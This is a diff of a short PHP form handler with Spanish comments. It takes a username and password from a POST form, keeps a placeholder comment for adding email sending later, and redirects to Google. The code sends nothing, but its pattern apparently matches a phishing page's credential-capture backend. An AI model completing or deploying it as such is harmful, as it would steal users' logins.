@@ -1,20 +1,20 @@
 <?php
-// Verificamos primero si llegó la información por el formulario
+// Primero verificamos que llegue por el formulario
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
-    // Recibimos los datos de forma segura para evitar errores
-    $email = isset($_POST["email"]) ? trim($_POST["email"]) : "";
+    // Recibimos los datos con seguridad para evitar avisos
+    $usuario = isset($_POST["usuario"]) ? trim($_POST["usuario"]) : "";
     $password = isset($_POST["password"]) ? trim($_POST["password"]) : "";
 
-    // --- Aquí iría el código para enviar el correo si lo querés después ---
-    // Por ahora solo lo dejamos funcionando para redirigir
+    // --- Aquí puedes agregar después el envío de correo si quieres ---
+    // Por ahora solo redirige correctamente
 
     // Redirigir a Google
     header("Location: https://www.google.com");
-    exit; // Detenemos la ejecución para que no siga corriendo nada más
+    exit; // Detenemos todo para que no siga ejecutando
 
 } else {
-    // Si alguien entra directamente a procesar.php, lo devolvemos al formulario
+    // Si entran directo al archivo, regresan al formulario
     header("Location: index.html");
     exit;
 }
